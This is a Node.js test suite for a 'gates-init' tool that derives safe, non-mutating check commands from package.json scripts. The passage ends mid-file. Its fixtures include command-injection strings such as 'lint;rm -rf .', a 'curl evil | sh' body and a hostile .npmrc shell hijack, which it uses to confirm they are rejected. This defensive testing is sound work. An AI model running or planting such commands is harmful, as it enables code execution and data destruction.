import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import {
  mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, readdirSync, symlinkSync,
  realpathSync, chmodSync,
} from 'node:fs';
import { spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  GATES_INIT_STOP,
  TRUST_CHAIN_DISCLOSURE,
  detectPackageManager,
  kebabIdOf,
  deriveScriptEntries,
  reviewStateCandidate,
  coverageCheckCandidate,
  sourceSizeCandidate,
  buildOffer,
  formatPreview,
  applyFill,
  main,
} from './gates-init.mjs';
import { loadDeclaration, validateDeclaration, isFinalCapableDeclaration } from './run-gates.mjs';
import { coverageProducerPrecedes } from './gates-declaration.mjs';
import { KIT_WRITER_PREVIEW_TOOLS, UNIVERSAL_READONLY_ALLOWLIST } from './velocity-profile.mjs';
import { COVERAGE_PRODUCER_BODY, matchesCoverageProducer } from './coverage-producer.mjs';
import { buildForeignFixture, FOREIGN_TEST_SCRIPT } from '../../scripts/testing/foreign-fixture.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const GATES_REL = join('docs', 'ai', 'gates.json');

// A `node --test` suite body is the ONE allowlist member the offer wires the lcov reporters onto
// (Phase 1.2) — every other body is emitted verbatim and produces no coverage.
const PRODUCER_BODY = COVERAGE_PRODUCER_BODY;
// The canonical checker cmd, resolved against THIS kit — matchesCanonicalCheck realpath-anchors it.
const CANONICAL_CHECKER_CMD = `node "${join(HERE, 'coverage-check.mjs')}" --check`;

// The Decision-1 exec forms (test-pinned literals — the derivation must emit these EXACTLY). The
// `COREPACK_ENABLE_NETWORK=0` prefix disables Corepack PM-provisioning fetch (council R3 fold).
const CN = 'COREPACK_ENABLE_NETWORK=0';
const NPM_EXEC = (body) => `${CN} npm exec --offline --script-shell /bin/sh -- ${body}`;
const PNPM_EXEC = (body) => `${CN} pnpm exec -- ${body}`;
const YARN_EXEC = (body) => `${CN} yarn exec -- ${body}`;

// pnpm/yarn spawn cases skip-if-absent during dev; the release lane provisions all three via
// corepack and runs them mandatory (Phase 5 of the shipping plan — never ship on skips).
// COREPACK_ENABLE_NETWORK=0 on the probe itself (AD-044 Plan 4): an unprovisioned corepack shim
// would otherwise fetch the PM from the registry AT MODULE LOAD — a network prompt under a
// sandboxed run — and then be skipped anyway when the fetch is denied. Offline: provisioned PMs
// still answer; unprovisioned ones fail fast and their lanes skip loudly, same behavior no prompt.
const canRunPm = (pm) =>
  spawnSync(pm, ['--version'], { encoding: 'utf8', env: { ...process.env, COREPACK_ENABLE_NETWORK: '0' } }).status === 0;
const PNPM_AVAILABLE = canRunPm('pnpm');
const YARN_AVAILABLE = canRunPm('yarn');

let cwd;
beforeEach(() => {
  // realpath: a fixture cwd under a symlinked OS tmp dir (macOS /tmp -> /private/tmp) must not
  // trip the Decision-5 symlink-root refusal.
  cwd = realpathSync(mkdtempSync(join(tmpdir(), 'gates-init-')));
});
afterEach(() => rmSync(cwd, { recursive: true, force: true }));

// A full project fixture: docs/ai + stamp + package.json (+ optional lockfile / config / gates).
const mkProject = ({ scripts = {}, lockfile, packageManager, config, gates, stamp = '3.0.0' } = {}) => {
  mkdirSync(join(cwd, 'docs', 'ai'), { recursive: true });
  if (stamp) writeFileSync(join(cwd, 'docs', 'ai', '.workflow-version'), `${stamp}\n`);
  writeFileSync(
    join(cwd, 'package.json'),
    JSON.stringify({ name: 'fixture', ...(packageManager ? { packageManager } : {}), scripts }, null, 2),
  );
  if (lockfile) writeFileSync(join(cwd, lockfile), '');
  if (config) writeFileSync(join(cwd, 'docs', 'ai', 'orchestration.json'), JSON.stringify(config, null, 2));
  if (gates !== undefined) {
    writeFileSync(join(cwd, GATES_REL), typeof gates === 'string' ? gates : JSON.stringify(gates, null, 2));
  }
};
const gatesRaw = () => readFileSync(join(cwd, GATES_REL), 'utf8');
const quiet = () => {
  const out = [];
  return { log: (l) => out.push(String(l)), error: (l) => out.push(String(l)), out };
};

// An inert body shim in the fixture's node_modules/.bin — the hermetic form of the probe method.
const writeBinShim = (name, marker) => {
  const bin = join(cwd, 'node_modules', '.bin');
  mkdirSync(bin, { recursive: true });
  writeFileSync(join(bin, name), `#!/bin/sh\necho ${marker} "$@"\n`);
  chmodSync(join(bin, name), 0o755);
};

// Spawns a seeded cmd the way the gate runner does (ONE bash line from the project root). npm's
// cache AND global prefix are ISOLATED per fixture: `npm exec --offline` falls back to the host's
// GLOBAL tree before the cache (host-proven), so without the prefix isolation a globally-installed
// runner would make the no-fetch cases flaky. pnpm/yarn resolve a runner from PATH as a last
// resort — PATH cannot be surgically stripped (the PMs and node live in the same bin dir as
// global packages), so the lanes that need an ABSENT runner skip loudly when it is PATH-resolvable.
const spawnSeeded = (cmd, dir = cwd, { isolatePrefix = true } = {}) =>
  spawnSync('bash', ['-c', cmd], {
    cwd: dir,
    encoding: 'utf8',
    timeout: 120_000,
    env: {
      ...process.env,
      // The runner exports AW_GIT_DIR to every gate child (run-gates.mjs:502) and a wired coverage
      // producer writes its lcov there; a by-hand spawn must supply it or the destination resolves
      // to the filesystem root.
      AW_GIT_DIR: dir,
      npm_config_cache: join(dir, '.isolated-npm-cache'),
      ...(isolatePrefix ? { npm_config_prefix: join(dir, '.isolated-npm-prefix') } : {}),
      // No network side-channels under a sandboxed suite run (the D4 sandbox-safe shape): a
      // missing-runner npm/pnpm resolution must fail OFFLINE (the same fail-closed outcome the
      // negative lanes assert), never reach for the registry.
      npm_config_offline: 'true',
      npm_config_audit: 'false',
      npm_config_fund: 'false',
      npm_config_update_notifier: 'false',
      NO_UPDATE_NOTIFIER: '1',
    },
  });

const onPath = (bin) => spawnSync('bash', ['-c', `command -v ${bin}`], { encoding: 'utf8' }).status === 0;

const seededCmdOf = (id = 'test') => {
  const entry = deriveScriptEntries(cwd).find((e) => e.id === id);
  assert.ok(entry, `the "${id}" entry must be offered`);
  return entry.cmd;
};

// ── derivation invariants (LOCKED in the plan) ────────────────────────────────────────

describe('gates-init — derivation: warn-flagged candidates NEVER enter the offer', () => {
  it('release/publish/deploy/push/version/commit/tag + pre/post hooks are excluded, not offered-with-a-warning', () => {
    mkProject({ scripts: {
      test: 'node --test', 'release:npm': 'npm publish', deploy: 'x', push: 'x', version: 'x',
      commit: 'git-cz', tag: 'x', prepublishOnly: 'x', postinstall: 'x', publish: 'x',
    } });
    const entries = deriveScriptEntries(cwd);
    assert.deepEqual(entries.map((e) => e.id), ['test'], 'only the terminating non-warn script survives');
  });
});

describe('gates-init — derivation: only TERMINATING verification classes are offered', () => {
  it('test/lint/type-check/build classes are offered; dev/start/watch/serve/preview and formatter write-mode are not', () => {
    mkProject({ scripts: {
      test: 'node --test', 'test:unit': 'node --test', lint: 'eslint .', typecheck: 'tsc --noEmit',
      'type-check': 'tsc -p . --noEmit', build: 'vite build', 'build:prod': 'vite build',
      dev: 'x', start: 'x', serve: 'x', preview: 'x', 'test:watch': 'x', watch: 'x', format: 'prettier -w .', prettier: 'x',
    } });
    const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
    assert.deepEqual(ids, ['build', 'build-prod', 'lint', 'test', 'test-unit', 'type-check', 'typecheck']);
  });

  it('a script NAME with shell metacharacters or whitespace never enters the offer (the cmd is bash-interpolated + hook-auto-approvable)', () => {
    mkProject({ scripts: {
      'test:ci && echo pwn': 'x',
      'test one': 'x',
      'lint;rm -rf .': 'x',
      'build$(x)': 'x',
      test: 'node --test',
    } });
    const entries = deriveScriptEntries(cwd);
    assert.deepEqual(entries.map((e) => e.id), ['test'], 'only the shell-safe script name survives');
    assert.deepEqual(entries.map((e) => e.cmd), [NPM_EXEC(PRODUCER_BODY)]);
  });

  it('a WATCH/SERVE body never enters the offer — non-membership in the closed-world allowlist screens it', () => {
    mkProject({ scripts: {
      test: 'vitest --watch',
      build: 'vite build --watch',
      'test:ci': 'vitest run',
      lint: 'eslint . --serve', // pathological, still a non-terminating body flag
      typecheck: 'tsc --noEmit',
    } });
    const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
    assert.deepEqual(ids, ['test-ci', 'typecheck'], 'watch/serve bodies are screened out, terminating bodies stay');
  });

  it('a terminating NAME with a release/publish/deploy BODY never enters the offer (test: "npm publish")', () => {
    mkProject({ scripts: {
      test: 'npm publish',
      lint: 'git commit -m x',
      build: 'npm run deploy',
      'build:site': 'git push origin main',
      'test:real': 'node --test',
      typecheck: 'tsc --noEmit',
    } });
    const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
    assert.deepEqual(ids, ['test-real', 'typecheck'], 'dangerous body tokens disqualify regardless of the clean name');
  });

  it('non-terminating tokens are screened in ANY name segment; a non-member body (vite preview) never enters', () => {
    mkProject({ scripts: {
      'build:preview': 'vite preview',
      'test:serve': 'serve report',
      'lint:dev': 'eslint .',
      build: 'vite preview', // terminating name, non-terminating (and non-member) body
      'build:prod': 'vite build',
      test: 'node --test',
    } });
    const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
    assert.deepEqual(ids, ['build-prod', 'test'], 'mid-name segments and non-member bodies both disqualify');
  });

  it('a MUTATING VARIANT of a terminating class never enters the offer — by name (lint:fix, test:update) or by body (--fix/--write/-w/-u)', () => {
    // A hook-auto-approvable gate must never be a writer: `lint:fix` passes the class prefix but
    // mutates; a plain `lint` whose BODY carries `--fix` mutates just the same.
    mkProject({ scripts: {
      'lint:fix': 'eslint --fix .',
      'test:update': 'node --test',
      'build:write': 'x',
      lint: 'eslint --fix .',
      test: 'jest -u',
      'test:snapshot': 'jest',
      typecheck: 'tsc -w',
      build: 'vite build',
      'lint:ci': 'eslint .',
    } });
    const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
    assert.deepEqual(ids, ['build', 'lint-ci'], 'only the verifiably terminating, non-mutating entries survive');
  });
});

describe('gates-init — derivation: package-manager detection (the cmd-shape pins live in T4)', () => {
  it('the package.json packageManager field beats the lockfile probe', () => {
    mkProject({ scripts: { test: 'x' }, lockfile: 'yarn.lock', packageManager: 'pnpm@9.0.0' });
    assert.equal(detectPackageManager(cwd), 'pnpm');
  });
});

describe('gates-init — derivation: kebab-case ids that pass the runner validator', () => {
  it('build:prod → build-prod; every derived entry validates as a full declaration', () => {
    assert.equal(kebabIdOf('build:prod'), 'build-prod');
    assert.equal(kebabIdOf('Test_E2E'), 'test-e2e');
    mkProject({ scripts: { 'build:prod': 'vite build', 'test.integration': 'node --test', lint: 'eslint .' } });
    const entries = deriveScriptEntries(cwd);
    assert.deepEqual(validateDeclaration({ gates: entries }), entries, 'the derived entries ARE a valid declaration');
  });
});

// ── T1: lifecycle-structural via exec (Issue-011 residual 1) ──────────────────────────

describe('gates-init — T1 lifecycle hooks die structurally: the offer is the hook-free exec form', () => {
  it('a hostile pretest sibling cannot ride a clean test name — the derived cmd is the exact npm exec form (derivation only, never spawns)', () => {
    mkProject({ scripts: { pretest: 'npm publish', test: 'node --test' } });
    const entries = deriveScriptEntries(cwd);
    assert.deepEqual(entries.map((e) => e.id), ['test'], 'the pre-hook sibling itself is warn-excluded');
    assert.equal(entries[0].cmd, NPM_EXEC(PRODUCER_BODY));
  });

  const mkHookedFixture = (lockfile) => {
    mkProject({ scripts: { pretest: 'echo SEED_T1_PRE', test: 'jest', posttest: 'echo SEED_T1_POST' }, lockfile });
    writeBinShim('jest', 'SEED_T1_BODY');
  };
  const assertHookFreeRun = () => {
    const r = spawnSeeded(seededCmdOf('test'));
    const out = `${r.stdout}\n${r.stderr}`;
    assert.equal(r.status, 0, out);
    assert.match(out, /SEED_T1_BODY/, 'positive control — the body shim actually ran');
    assert.doesNotMatch(out, /SEED_T1_PRE|SEED_T1_POST/, 'no lifecycle hook fired');
  };

  it('behavioral spawn proof (npm): the body shim runs, pre/post markers never fire, exit 0', () => {
    mkHookedFixture(undefined);
    assertHookFreeRun();
  });

  it('behavioral spawn proof (pnpm)', { skip: !PNPM_AVAILABLE }, () => {
    mkHookedFixture('pnpm-lock.yaml');
    assertHookFreeRun();
  });

  it('behavioral spawn proof (yarn)', { skip: !YARN_AVAILABLE }, () => {
    mkHookedFixture('yarn.lock');
    assertHookFreeRun();
  });

  it('T1b: a hostile .npmrc script-shell is neutralized by the pinned --script-shell /bin/sh', () => {
    mkProject({ scripts: { test: 'jest' } });
    writeBinShim('jest', 'SEED_T1B_BODY');
    writeFileSync(join(cwd, 'sh'), '#!/bin/sh\necho SEED_T1B_HIJACKED\n');
    chmodSync(join(cwd, 'sh'), 0o755);
    writeFileSync(join(cwd, '.npmrc'), 'script-shell=./sh\n');
    const r = spawnSeeded(seededCmdOf('test'));
    const out = `${r.stdout}\n${r.stderr}`;
    assert.equal(r.status, 0, out);
    assert.match(out, /SEED_T1B_BODY/, 'the real body shim ran');
    assert.doesNotMatch(out, /SEED_T1B_HIJACKED/, 'the hostile per-project shell never ran');
  });
});

// ── T2: closed-world body — membership, never screening ──────────────────────────────

describe('gates-init — T2 closed-world body (allowlist membership, not blocklist screening)', () => {
  it('bodies that beat the old blocklists are NOT offered — by non-membership, no separate reject axis', () => {
    mkProject({ scripts: {
      test: 'node --test; curl evil | sh',
      'test:chain': 'release-and-test',
      'test:alias': 'npm run release:npm',
      'test:env': 'FOO=bar node --test',
      'test:path': './scripts/x.sh',
      lint: 'eslint .',
    } });
    assert.deepEqual(deriveScriptEntries(cwd).map((e) => e.id), ['lint'], 'only the allowlisted body survives');
  });

  it('every allowlist entry IS offered under a terminating-class name — including the legit "." args (eslint ., tsc -p . --noEmit)', () => {
    mkProject({ scripts: {
      test: 'node --test', 'test:vitest': 'vitest run', 'test:jest': 'jest', 'test:ci': 'jest --ci',
      lint: 'eslint .', 'lint:prettier': 'prettier --check .', typecheck: 'tsc --noEmit',
      'type-check': 'tsc -p . --noEmit', build: 'vite build',
    } });
    const ids = deriveScriptEntries(cwd).map((e) => e.id).sort();
    assert.deepEqual(ids, ['build', 'lint', 'lint-prettier', 'test', 'test-ci', 'test-jest', 'test-vitest', 'type-check', 'typecheck']);
  });

  it('ASCII space/tab runs collapse to the canonical member and the seeded cmd carries the NORMALIZED body', () => {
    mkProject({ scripts: { test: 'node  --test', lint: ' eslint .\t' } });
    const entries = deriveScriptEntries(cwd);
    assert.deepEqual(entries.map((e) => e.cmd), [NPM_EXEC(PRODUCER_BODY), NPM_EXEC('eslint .')]);
  });

  it('a forbidden char (NBSP/newline/CR/BOM/U+2028) disqualifies at LEADING, TRAILING and EMBEDDED positions — the reject runs BEFORE any trim', () => {
    mkProject({ scripts: {
      test: '\u00A0node --test',
      lint: 'eslint .\n',
      'test:cr': 'node --test\r',
      typecheck: '\uFEFFtsc --noEmit',
      build: 'vite\u2028build',
    } });
    assert.deepEqual(deriveScriptEntries(cwd), [], 'no forbidden-whitespace body is ever offered');
  });

  it('a non-string (array) body value is NOT offered — fail-closed on type', () => {
    mkProject({ scripts: { test: ['node', '--test'], lint: 'eslint .' } });
    assert.deepEqual(deriveScriptEntries(cwd).map((e) => e.id), ['lint']);
  });
});

// ── T3: allowlist self-safety (guards the PRODUCTION export, not a test duplicate) ────

describe('gates-init — T3 allowlist self-safety (criterion ii: an unsafe future edit fails here)', () => {
  it('every production allowlist entry is a normalized, metacharacter-free, non-writing invocation of a recognized runner stem', async () => {
    const mod = await import('./gates-init.mjs');
    const { BODY_ALLOWLIST, HOST_RUNTIME_STEMS, PACKAGE_RUNNER_STEMS } = mod;
    assert.ok(Array.isArray(BODY_ALLOWLIST) && BODY_ALLOWLIST.length > 0, 'the PRODUCTION allowlist export exists');
    assert.ok(Array.isArray(HOST_RUNTIME_STEMS) && Array.isArray(PACKAGE_RUNNER_STEMS), 'the stem partition is exported');
    assert.equal(new Set(BODY_ALLOWLIST).size, BODY_ALLOWLIST.length, 'entries are unique');
    for (const entry of BODY_ALLOWLIST) {
      assert.equal(typeof entry, 'string', `string literal: ${entry}`);
      assert.ok(entry.length > 0, 'non-empty');
      assert.match(entry, /^[A-Za-z0-9 .-]+$/, `no shell metacharacter, quoting, or non-ASCII: ${entry}`);
      assert.doesNotMatch(entry, /(^|\s)(--fix|--write|-w|-u|--update\S*)(\s|$)/, `no write-mode flag: ${entry}`);
      const stem = entry.split(' ')[0];
      assert.ok(
        HOST_RUNTIME_STEMS.includes(stem) || PACKAGE_RUNNER_STEMS.includes(stem),
        `recognized runner stem (host-runtime or package-runner): ${stem}`,
      );
      assert.equal(entry, entry.trim().replace(/[ \t]+/g, ' '), `already in normal form: ${entry}`);
    }
    const stems = [...HOST_RUNTIME_STEMS, ...PACKAGE_RUNNER_STEMS];
    assert.equal(new Set(stems).size, stems.length, 'the stem partition is disjoint');
  });
});

// ── T4: per-PM exec forms + builder fail-closed + detector characterization ───────────

describe('gates-init — T4 per-PM exec forms (uniform, hook-free, -- separated)', () => {
  it('npm / pnpm / yarn projects each get their exact Decision-1 exec form', () => {
    mkProject({ scripts: { test: 'node --test' } });
    assert.equal(deriveScriptEntries(cwd)[0].cmd, NPM_EXEC(PRODUCER_BODY));
    writeFileSync(join(cwd, 'pnpm-lock.yaml'), '');
    assert.equal(deriveScriptEntries(cwd)[0].cmd, PNPM_EXEC(PRODUCER_BODY));
    rmSync(join(cwd, 'pnpm-lock.yaml'));
    writeFileSync(join(cwd, 'yarn.lock'), '');
    assert.equal(deriveScriptEntries(cwd)[0].cmd, YARN_EXEC(PRODUCER_BODY));
  });

  it('every per-PM exec form carries the COREPACK_ENABLE_NETWORK=0 prefix (no Corepack PM-provision fetch under an auto-approved gate)', async () => {
    const { execCmdFor } = await import('./gates-init.mjs');
    for (const pm of ['npm', 'pnpm', 'yarn']) {
      assert.match(execCmdFor(pm, 'node --test').cmd, /^COREPACK_ENABLE_NETWORK=0 /, `${pm} form disables Corepack network`);
    }
  });

  it('the review-state/coverage-check candidates are still offered under any PM (the slot rule is PM-independent)', () => {
    mkProject({
      scripts: { test: 'node --test' },
      lockfile: 'pnpm-lock.yaml',
      config: { 'plan-execution': { review: 'council' } },
    });
    assert.deepEqual(buildOffer(cwd).entries.map((e) => e.id), ['test', 'review-state', 'coverage-check']);
  });

  it('T4b: the cmd builder fails CLOSED on an unknown pm family — withhold with a loud note, never any run form', async () => {
    const { execCmdFor } = await import('./gates-init.mjs');
    assert.equal(typeof execCmdFor, 'function', 'the PRODUCTION builder export exists');
    const r = execCmdFor('bun', 'node --test');
    assert.equal(r.cmd, null, 'no cmd for an unverified family');
    assert.match(r.note, /package manager/i, 'the note is version-neutral and names the axis');
    assert.match(r.note, /by hand/, 'the note carries the hand-add recovery');
    // The derive layer inherits the builder's fail-closed rule: an injected unknown family
    // withholds every script entry and says so in the offer notes.
    mkProject({ scripts: { test: 'node --test' } });
    assert.deepEqual(deriveScriptEntries(cwd, { packageManager: 'bun' }), []);
    const offer = buildOffer(cwd, { packageManager: 'bun' });
    assert.ok(
      offer.notes.some((n) => /withheld/.test(n) && /\btest\b/.test(n) && /by hand/.test(n)),
      `the withheld ids are named loudly: ${offer.notes.join(' | ')}`,
    );
  });

  it('T4c: detectPackageManager collapses bun → npm today (KNOWN behavior, characterized)', () => {
    mkProject({ scripts: {}, packageManager: 'bun@1' });
    assert.equal(detectPackageManager(cwd), 'npm', 'a bun packageManager field falls back to npm');
    writeFileSync(join(cwd, 'package.json'), JSON.stringify({ name: 'fixture', scripts: {} }));
    writeFileSync(join(cwd, 'bun.lockb'), '');
    assert.equal(detectPackageManager(cwd), 'npm', 'bun.lockb is not probed');
  });
});

describe('gates-init — T4d per-PM no-network fail-closed (missing package-runner)', () => {
  it('npm: --offline + an ISOLATED empty cache → the missing runner is refused as a cache miss, never fetched', () => {
    mkProject({ scripts: { test: 'vitest run' } });
    const r = spawnSeeded(seededCmdOf('test'));
    const out = `${r.stdout}\n${r.stderr}`;
    assert.notEqual(r.status, 0, 'fail-closed');
    assert.match(out, /ENOTCACHED|only-if-cached/, `offline cache-miss refusal, not a fetch: ${out}`);
  });

  // pnpm/yarn fall back to PATH resolution, so these two lanes need vitest ABSENT from PATH —
  // they skip loudly (never lie) on a host with a global vitest. The refusal oracle matches the
  // RUNNER-NOT-FOUND signature class — which varies by PM version (`spawn … EACCES/ENOENT`,
  // pnpm's `ERR_PNPM…`/`EACCES`, yarn 1.22.19 `spawn … EACCES` vs 1.22.22 `Couldn't find the
  // binary`) but is disjoint from the executed-and-failed `Command failed / Exit code: N` string a
  // runner that ran-then-failed would print (the wrong-path admission we must exclude).
  const NOT_FOUND = /Couldn't find the binary|command not found|no such file|EACCES|ENOENT|ERR_PNPM/i;
  it('pnpm: a missing runner fails closed locally, no network', { skip: !PNPM_AVAILABLE || onPath('vitest') }, () => {
    mkProject({ scripts: { test: 'vitest run' }, lockfile: 'pnpm-lock.yaml' });
    const r = spawnSeeded(seededCmdOf('test'));
    assert.notEqual(r.status, 0, 'fail-closed');
    assert.match(`${r.stdout}\n${r.stderr}`, NOT_FOUND, 'a runner-not-found refusal, never an executed-and-failed runner');
  });

  it('yarn: a missing runner fails closed locally, no network', { skip: !YARN_AVAILABLE || onPath('vitest') }, () => {
    mkProject({ scripts: { test: 'vitest run' }, lockfile: 'yarn.lock' });
    const r = spawnSeeded(seededCmdOf('test'));
    assert.notEqual(r.status, 0, 'fail-closed');
    const out = `${r.stdout}\n${r.stderr}`;
    assert.match(out, NOT_FOUND, 'a runner-not-found refusal, never an executed-and-failed runner');
    assert.doesNotMatch(out, /Command failed\.?\s*\n?\s*Exit code:/i, 'must not be the yarn executed-and-failed signature');
  });

  it('a host-runtime body (node --test) needs no local bin: still offered, still runs (the partition must not withhold node)', () => {
    mkProject({ scripts: { test: 'node --test' } });
    writeFileSync(join(cwd, 'smoke.test.mjs'), "import { test } from 'node:test';\ntest('ok', () => {});\n");
    // No prefix isolation here: npm exec resolves `node` through the host's real npm prefix
    // (node's own install bin — nvm/brew/apt all ship node there), exactly as on a real host;
    // an isolated empty prefix would be an artificial environment stricter than any real one.
    const r = spawnSeeded(seededCmdOf('test'), cwd, { isolatePrefix: false });
    assert.equal(r.status, 0, `${r.stdout}\n${r.stderr}`);
  });
});

// ── T5: leading-dash name (ALWAYS-GREEN characterization) ─────────────────────────────

describe('gates-init — T5 a leading-dash script name never enters the offer', () => {
  it('the ^-anchored terminating-class pattern makes "-test" unreachable (characterized)', () => {
    mkProject({ scripts: { '-test': 'node --test', test: 'node --test' } });
    assert.deepEqual(deriveScriptEntries(cwd).map((e) => e.id), ['test']);
  });
});

// ── T6: offer honesty — screened-out scripts are named, the residual is disclosed ─────

describe('gates-init — T6 offer honesty (nothing screened out silently)', () => {
  it('gate-class-named scripts with non-allowlisted bodies are counted and named (ids) in a preview note with the hand-add pointer', () => {
    mkProject({ scripts: { test: 'mocha', 'test:e2e': 'playwright test', lint: 'eslint .' } });
    const io = quiet();
    assert.equal(main(['--cwd', cwd], io), 0);
    const text = io.out.join('\n');
    assert.match(text, /eslint \./, 'the allowlisted entry is offered');
    assert.match(text, /2 .*screened out/, 'the screened-out scripts are counted');
    assert.match(text, /test, test-e2e/, 'the screened-out scripts are named by id');
    assert.match(text, /by hand/, 'the hand-add recovery is stated');
  });

  it('the trust-chain disclosure carries the runtime-residual sentence (Decision 6)', () => {
    mkProject({ scripts: { test: 'node --test' } });
    const io = quiet();
    assert.equal(main(['--cwd', cwd], io), 0);
    const text = io.out.join('\n');
    assert.match(text, /project-controlled code/, 'the residual names what actually runs');
    assert.match(text, /does not sandbox/, 'the non-claim is explicit');
  });

  it('the --apply SUCCESS path still carries the screened-out note — a mixed offer never silently omits the screened script', () => {
    mkProject({ scripts: { test: 'mocha', lint: 'eslint .' } });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply'], io), 0);
    const text = io.out.join('\n');
    assert.match(text, /declared 1 consented gate\(s\).*lint/, 'the allowlisted entry was applied');
    assert.match(text, /screened out/, 'the note survives onto the apply-success path');
    assert.match(text, /\btest\b/, 'the screened-out id is named');
    assert.deepEqual(loadDeclaration(cwd).gates.map((g) => g.id), ['lint']);
  });

  it('the --apply "nothing to offer" path carries the same screened-out note (the user learns WHY)', () => {
    mkProject({ scripts: { test: 'mocha' } });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply'], io), 0);
    const text = io.out.join('\n');
    assert.match(text, /nothing to offer/i);
    assert.match(text, /screened out/, 'the note appears on the apply path too');
    assert.match(text, /\btest\b/, 'the screened-out id is named');
    assert.match(text, /by hand/);
    assert.equal(readdirSync(join(cwd, 'docs', 'ai')).includes('gates.json'), false, 'nothing written');
  });
});

// ── T7: preflight parent-chain (Issue-011 residual 3) — seeder-level integration ──────

describe('gates-init — T7 a symlinked docs PARENT is a preflight STOP on preview AND apply', () => {
  it('preview and apply both STOP (exit 1) naming the symlinked component, before any read', () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'gates-init-symlink-')));
    try {
      mkdirSync(join(root, 'target', 'ai'), { recursive: true });
      writeFileSync(join(root, 'target', 'ai', '.workflow-version'), '3.0.0\n');
      writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'fixture', scripts: { test: 'node --test' } }));
      symlinkSync(join(root, 'target'), join(root, 'docs'));
      const preview = quiet();
      assert.equal(main(['--cwd', root], preview), 1, preview.out.join('\n'));
      assert.match(preview.out.join('\n'), /symlink/, 'the STOP names the symlink');
      assert.match(preview.out.join('\n'), /docs/, 'the STOP names the component');
      const apply = quiet();
      assert.equal(main(['--cwd', root, '--apply'], apply), 1);
      assert.match(apply.out.join('\n'), /symlink/);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});

// ── the review-state candidate (locked decision) ─────────────────────────────────────

describe('gates-init — the review-state candidate keys on the slot the checker enforces', () => {
  const COUNCIL_ON_EXECUTION = { 'plan-execution': { review: 'council' } };

  it('offered when plan-execution.review declares reviewed/council; cmd is QUOTED and validates', () => {
    mkProject({ scripts: {}, config: COUNCIL_ON_EXECUTION });
    const { candidate } = reviewStateCandidate(cwd);
    assert.ok(candidate, 'the candidate must be offered');
    assert.equal(candidate.id, 'review-state');
    assert.match(candidate.cmd, /^node "[^"]*tools\/review-state\.mjs" --check$/, 'resolved + QUOTED path (spaces survive)');
    assert.deepEqual(validateDeclaration({ gates: [candidate] }), [candidate]);
  });

  it('a kit path with shell metacharacters is WITHHELD (loud note) — quoting must actually survive bash', () => {
    // The declared cmd runs via bash and becomes hook-auto-approvable: a `$`/backtick/`"`/backslash
    // inside double quotes still expands, so an unsafe path is refused, never offered wrongly-quoted.
    mkProject({ scripts: {}, config: COUNCIL_ON_EXECUTION });
    for (const evil of ['/tmp/kit$dir/tools/review-state.mjs', '/tmp/kit`x`/tools/review-state.mjs', '/tmp/ki"t/tools/review-state.mjs', '/tmp/kit\\dir/tools/review-state.mjs']) {
      const r = reviewStateCandidate(cwd, { reviewStateTool: evil });
      assert.equal(r.candidate, null, `unsafe path must be withheld: ${evil}`);
      assert.ok(r.note && /by hand/i.test(r.note), 'the withhold is stated with the hand-add recovery');
    }
    const spaced = reviewStateCandidate(cwd, { reviewStateTool: '/tmp/my kit dir/tools/review-state.mjs' });
    assert.ok(spaced.candidate, 'a path with spaces is exactly what the quoting is FOR — still offered');
    assert.equal(spaced.candidate.cmd, 'node "/tmp/my kit dir/tools/review-state.mjs" --check');
  });

  it('NEVER offered on a solo config, a council-on-plan-authoring-ONLY config, or a missing config', () => {
    mkProject({ scripts: {}, config: { 'plan-authoring': { review: 'council' }, 'plan-execution': { review: 'solo' } } });
    assert.equal(reviewStateCandidate(cwd).candidate, null, 'plan-authoring council must not trigger the offer');
    rmSync(join(cwd, 'docs', 'ai', 'orchestration.json'));
    assert.equal(reviewStateCandidate(cwd).candidate, null, 'no config → no candidate');
  });

  it('a malformed config → no candidate + a loud note (never a crash, never a silent skip)', () => {
    mkProject({ scripts: {} });
    writeFileSync(join(cwd, 'docs', 'ai', 'orchestration.json'), '{ bad');
    const r = reviewStateCandidate(cwd);
    assert.equal(r.candidate, null);
    assert.ok(r.note, 'the skip is stated');
  });
});

// ── the coverage-check candidate (D3(a)) — same conditional rule, the core-pair sibling ───────
describe('gates-init — the coverage-check candidate keys on the same slot (D3(a))', () => {
  const COUNCIL_ON_EXECUTION = { 'plan-execution': { review: 'council' } };

  it('offered when plan-execution.review declares reviewed/council; cmd is QUOTED and validates', () => {
    mkProject({ scripts: {}, config: COUNCIL_ON_EXECUTION });
    const { candidate } = coverageCheckCandidate(cwd);
    assert.ok(candidate, 'the candidate must be offered');
    assert.equal(candidate.id, 'coverage-check');
    assert.match(candidate.cmd, /^node "[^"]*tools\/coverage-check\.mjs" --check$/, 'resolved + QUOTED path (spaces survive)');
    assert.deepEqual(validateDeclaration({ gates: [candidate] }), [candidate]);
  });

  it('a kit path with shell metacharacters is WITHHELD (loud note)', () => {
    mkProject({ scripts: {}, config: COUNCIL_ON_EXECUTION });
    const r = coverageCheckCandidate(cwd, { coverageCheckTool: '/tmp/kit$dir/tools/coverage-check.mjs' });
    assert.equal(r.candidate, null);
    assert.ok(r.note && /by hand/i.test(r.note), 'the withhold is stated with the hand-add recovery');
  });

  it('NEVER offered on a solo config or a council-on-plan-authoring-ONLY config', () => {
    mkProject({ scripts: {}, config: { 'plan-authoring': { review: 'council' }, 'plan-execution': { review: 'solo' } } });
    assert.equal(coverageCheckCandidate(cwd).candidate, null);
  });

  it('buildOffer appends coverage-check LAST — a whole-offer apply is final-ready by construction', () => {
    mkProject({ scripts: { test: 'node --test' }, config: COUNCIL_ON_EXECUTION });
    const ids = buildOffer(cwd).entries.map((e) => e.id);
    assert.equal(ids[ids.length - 1], 'coverage-check');
  });
});

// ── preview (dry-run) behavior ────────────────────────────────────────────────────────

describe('gates-init — preview is the default and writes NOTHING', () => {
